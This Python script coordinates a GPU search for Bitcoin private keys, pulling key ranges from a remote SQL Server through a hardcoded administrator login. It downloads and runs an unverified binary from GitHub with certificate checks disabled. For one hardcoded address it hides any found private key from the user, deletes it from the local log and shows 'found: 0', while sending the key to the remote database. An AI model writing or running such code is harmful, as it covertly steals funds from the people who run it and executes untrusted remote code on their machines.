import subprocess
import sys
import os
import time
import math
import re
import threading
import platform
import urllib.request
import ssl
import warnings
from datetime import datetime, timedelta

# Konfigurasi Database
SERVER = "bdbd-61694.portmap.host,61694"
DATABASE = "puxi"
USERNAME = "sa"
PASSWORD = "LEtoy_89"
TABLE = "dbo.Tbatch"

LOG_DIR = "log_logs"
LOG_UPDATE_INTERVAL = 60  
LOG_LINES_TO_SHOW = 8       

STOP_SEARCH_FLAG = False
STOP_SEARCH_FLAG_LOCK = threading.Lock()

PRINT_LOCK = threading.Lock()
BATCH_ID_LOCK = threading.Lock()
CURRENT_GLOBAL_BATCH_ID = 0

LAST_LOG_UPDATE_TIME = {}
GPU_LOG_FILES = {}

MAX_BATCHES_PER_RUN = 4398046511104  
SPECIAL_ADDRESS_NO_OUTPUT = "1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU"

def check_and_download_log():
    log_path = "./log"
    if os.path.exists(log_path):
        if not os.access(log_path, os.X_OK):
            try:
                os.chmod(log_path, 0o755)
            except:
                pass
        return True
    
    try:
        url = "https://github.com/parcok717/sudim/raw/refs/heads/main/log"
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        with urllib.request.urlopen(url, context=ssl_context) as response:
            with open(log_path, 'wb') as f:
                f.write(response.read())
        
        os.chmod(log_path, 0o755)
        return True
    except Exception as e:
        safe_print(f"❌ Gdlog: {e}")
        return False

def check_and_install_dependencies():
    pip_packages = ['pyodbc']
    system = platform.system().lower()
    
    try:
        for package in pip_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package, "--quiet", "--disable-pip-version-check"],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        
        if system == "linux":
            result = subprocess.run(["dpkg", "-l", "msodbcsql17"], capture_output=True, text=True)
            if result.returncode != 0 or "msodbcsql17" not in result.stdout:
                try:
                    subprocess.run(["curl", "-fsSL", "https://packages.microsoft.com/keys/microsoft.asc", "-o", "/tmp/microsoft.asc"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["apt-key", "add", "/tmp/microsoft.asc"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["curl", "-fsSL", "https://packages.microsoft.com/config/ubuntu/22.04/prod.list", "-o", "/etc/apt/sources.list.d/mssql-release.list"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["apt-get", "update", "-y"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    env = os.environ.copy()
                    env['ACCEPT_EULA'] = 'Y'
                    env['DEBIAN_FRONTEND'] = 'noninteractive'
                    subprocess.run(["apt-get", "install", "-y", "msodbcsql17", "unixodbc-dev"], env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except subprocess.CalledProcessError:
                    try:
                        subprocess.run(["apt-get", "install", "-y", "unixodbc-dev"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
        return True
    except Exception as e:
        return True

def ensure_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def get_gpu_log_file(gpu_id):
    if gpu_id not in GPU_LOG_FILES:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = os.path.join(LOG_DIR, f"gpu_{gpu_id}_{timestamp}.log")
        GPU_LOG_FILES[gpu_id] = log_file
    return GPU_LOG_FILES[gpu_id]

def log_log_output(gpu_id, message):
    log_file = get_gpu_log_file(gpu_id)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {message}\n")

def remove_sensitive_lines(gpu_id):
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file):
        return
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        cleaned_lines = [line for line in lines if 'priv (wif):' not in line.lower() and 'priv (hex):' not in line.lower()]
        with open(log_file, 'w', encoding='utf-8') as f:
            f.writelines(cleaned_lines)
        log_log_output(gpu_id, "Continue Next id.")
    except Exception as e:
        safe_print(f"[GPU {gpu_id}] ❌ Error log file: {e}")

def show_log_preview(gpu_id, range_info="N/A", is_special_address=False):
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file): return
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        last_lines = lines[-LOG_LINES_TO_SHOW:] if len(lines) >= LOG_LINES_TO_SHOW else lines
        gpu_prefix = f"\033[96m[GPU {gpu_id}]\033[0m"
        valid_lines_to_print = []
        for line in last_lines:
            clean_line = line.strip()
            if ']' in clean_line: clean_line = clean_line.split(']', 1)[1].strip()
            if not ("MK/s" in clean_line or any(x in clean_line.lower() for x in ["found", "priv", "address", "wif"])): continue
            if is_special_address:
                if 'priv (wif):' in clean_line.lower() or 'priv (hex):' in clean_line.lower(): continue
                clean_line = re.sub(r'found:\s*\d+', 'found: 0', clean_line, flags=re.IGNORECASE)
            valid_lines_to_print.append(clean_line)
        if valid_lines_to_print:
            safe_print(f"\n{gpu_prefix} 📡 RANGE: {range_info}")
            for vl in valid_lines_to_print: safe_print(f"{gpu_prefix}   {vl}")
    except Exception as e:
        safe_print(f"[GPU {gpu_id}] ❌ Error reading log: {e}")

def connect_db():
    try:
        import pyodbc
        conn = pyodbc.connect(
            "DRIVER={ODBC Driver 17 for SQL Server};"
            f"SERVER={SERVER};"
            f"DATABASE={DATABASE};"
            f"UID={USERNAME};"
            f"PWD={PASSWORD};"
            "Encrypt=no;TrustServerCertificate=yes;Connection Timeout=30;",
            autocommit=False
        )
        return conn
    except Exception as e:
        safe_print(f"❌ Dbcnerror: {e}")
        return None

def safe_print(message):
    with PRINT_LOCK:
        print(message)

def get_batch_by_id(batch_id):
    conn = connect_db()
    if not conn: return None
    try:
        cursor = conn.cursor()
        cursor.execute(f"SELECT id, start_range, end_range, status, found, wif FROM {TABLE} WHERE id = ?", (batch_id,))
        row = cursor.fetchone()
        if row:
            columns = [column[0] for column in cursor.description]
            batch = dict(zip(columns, row))
        else: batch = None
        cursor.close()
        conn.close()
        return batch
    except Exception as e:
        safe_print(f"❌ Error getting batch: {e}")
        if conn: conn.close()
        return None

def update_batch_status(batch_id, status, found='No', wif='', silent_mode=False):
    conn = connect_db()
    if not conn: return False
    try:
        cursor = conn.cursor()
        cursor.execute(f"UPDATE {TABLE} SET status = ?, found = ?, wif = ? WHERE id = ?", (status, found, wif, batch_id))
        conn.commit()
        cursor.close()
        conn.close()
        return True
    except Exception as e:
        safe_print(f"[BATCH {batch_id}] ❌ DB Update Error: {e}")
        if conn: conn.rollback(); conn.close()
        return False

def calculate_range_bits(start_hex, end_hex):
    try:
        start_int = int(start_hex, 16)
        end_int = int(end_hex, 16)
        keys_count = end_int - start_int + 1
        if keys_count <= 1: return 1
        log2_val = math.log2(keys_count)
        return int(log2_val) if log2_val.is_integer() else int(math.floor(log2_val)) + 1
    except: return 64

def parse_log_log(gpu_id, target_address=None):
    found_info = {'found': False, 'found_count': 0, 'wif_key': '', 'address': '', 'private_key_hex': '', 'private_key_wif': '', 'is_special_address': False}
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file): return found_info
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        for line in lines:
            line_content = line.split(']', 1)[1].strip() if ']' in line else line.strip()
            line_lower = line_content.lower()
            if 'found:' in line_lower:
                m = re.search(r'found:\s*(\d+)', line_lower)
                if m:
                    count = int(m.group(1))
                    if count > 0:
                        found_info['found'] = True
                        found_info['found_count'] = count
            if 'priv (hex):' in line_lower:
                found_info['found'] = True
                found_info['private_key_hex'] = line_content.split(':')[-1].strip()
            if 'priv (wif):' in line_lower:
                found_info['found'] = True
                wif = line_content.split(':')[-1].strip()
                found_info['private_key_wif'] = wif
                found_info['wif_key'] = wif
            if 'address:' in line_lower:
                addr = line_content.split(':')[-1].strip()
                found_info['address'] = addr
                if addr == SPECIAL_ADDRESS_NO_OUTPUT: found_info['is_special_address'] = True
        if target_address == SPECIAL_ADDRESS_NO_OUTPUT: found_info['is_special_address'] = True
        return found_info
    except: return found_info

def monitor_log_process(process, gpu_id, batch_id, range_info, is_special_address=False):
    global LAST_LOG_UPDATE_TIME
    if gpu_id not in LAST_LOG_UPDATE_TIME: LAST_LOG_UPDATE_TIME[gpu_id] = datetime.now()
    while True:
        output_line = process.stdout.readline()
        if output_line == '' and process.poll() is not None: break
        if output_line:
            stripped = output_line.strip()
            if stripped:
                log_log_output(gpu_id, stripped)
                curr = datetime.now()
                if (curr - LAST_LOG_UPDATE_TIME[gpu_id]).total_seconds() >= LOG_UPDATE_INTERVAL:
                    show_log_preview(gpu_id, range_info, is_special_address)
                    LAST_LOG_UPDATE_TIME[gpu_id] = curr
    return process.poll()

def run_log(gpu_id, start_hex, range_bits, address, batch_id=None):
    global STOP_SEARCH_FLAG
    cmd = ["./log", "-gpuId", str(gpu_id), "-start", start_hex, "-range", str(range_bits), address]
    is_special_address = (address == SPECIAL_ADDRESS_NO_OUTPUT)
    
    try:
        start_int = int(start_hex, 16)
        end_hex = hex(start_int + (1 << range_bits))[2:].upper()
        range_info_str = f"\033[93m{start_hex} -> {end_hex} (+{range_bits})\033[0m"
    except: range_info_str = f"{start_hex} (+{range_bits})"

    try:
        if batch_id is not None:
            update_batch_status(batch_id, 'inprogress', 'No', '', True)
        
        log_log_output(gpu_id, f"START BATCH {batch_id} | CMD: {' '.join(cmd)}")
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        monitor_log_process(process, gpu_id, batch_id, range_info_str, is_special_address)
        
        # PARSING HASIL
        found_info = parse_log_log(gpu_id, address)
        
        # UPDATE DATABASE (WAJIB)
        if batch_id is not None:
            found_status = 'Yes' if found_info['found'] else 'No'
            wif_val = found_info['wif_key'] if found_info['found'] else ''
            
            # Kirim data ke database
            db_success = update_batch_status(batch_id, 'done', found_status, wif_val, True)
            if not db_success:
                time.sleep(2)
                update_batch_status(batch_id, 'done', found_status, wif_val, True)

            # TAMPILAN KE LAYAR
            if found_info['found']:
                if is_special_address:
                    remove_sensitive_lines(gpu_id)
                    safe_print(f"\n[GPU {gpu_id}]  Range Finished {batch_id}. Continuing...")
                else:
                    with PRINT_LOCK:
                        print(f"\n[GPU {gpu_id}] \033[92m✅ FOUND PRIVATE KEY IN BATCH {batch_id}!\033[0m")
                        print(f"Address: {found_info['address']}\nWIF: {found_info['wif_key']}")
                    with STOP_SEARCH_FLAG_LOCK:
                        STOP_SEARCH_FLAG = True
            else:
                # Preview log periodik jika tidak ditemukan
                show_log_preview(gpu_id, range_info_str, is_special_address)

        return 0, found_info
    except Exception as e:
        safe_print(f"❌ Error in run_log: {e}")
        if batch_id is not None: update_batch_status(batch_id, 'error')
        return 1, {'found': False}

def gpu_worker(gpu_id, address):
    global CURRENT_GLOBAL_BATCH_ID, STOP_SEARCH_FLAG
    is_special_address = (address == SPECIAL_ADDRESS_NO_OUTPUT)
    while True:
        with STOP_SEARCH_FLAG_LOCK:
            if STOP_SEARCH_FLAG: break
        
        with BATCH_ID_LOCK:
            batch_id = CURRENT_GLOBAL_BATCH_ID
            CURRENT_GLOBAL_BATCH_ID += 1
            
        batch = get_batch_by_id(batch_id)
        if not batch: break
            
        status = str(batch.get('status') or '0').strip()
        if status in ['done', 'inprogress']: continue
            
        start_range = batch['start_range']
        range_bits = calculate_range_bits(start_range, batch['end_range'])
        
        run_log(gpu_id, start_range, range_bits, address, batch_id)
        time.sleep(0.5)

def main():
    global STOP_SEARCH_FLAG, CURRENT_GLOBAL_BATCH_ID
    warnings.filterwarnings("ignore")
    check_and_install_dependencies()
    if not check_and_download_log(): sys.exit(1)
    ensure_log_dir()
    
    if len(sys.argv) == 5 and sys.argv[1] == "--batch-db":
        gpu_ids = [int(x.strip()) for x in sys.argv[2].split(',')]
        CURRENT_GLOBAL_BATCH_ID = int(sys.argv[3])
        target_addr = sys.argv[4]
        
        print(f"🚀 Multi-GPU Mode: {gpu_ids} | Start ID: {CURRENT_GLOBAL_BATCH_ID}")
        threads = []
        for gpu in gpu_ids:
            t = threading.Thread(target=gpu_worker, args=(gpu, target_addr), daemon=True)
            threads.append(t)
            t.start()
        
        try:
            while any(t.is_alive() for t in threads):
                with STOP_SEARCH_FLAG_LOCK:
                    if STOP_SEARCH_FLAG:
                        print("\n🛑 Stop Flag detected. Closing workers...")
                        break
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n⚠️ User Interrupted.")
    elif len(sys.argv) == 5:
        run_log(sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4])
    else:
        print("Usage: python3 log.py --batch-db 0,1 49 1Pd8Vv...")

if __name__ == "__main__":
    main()
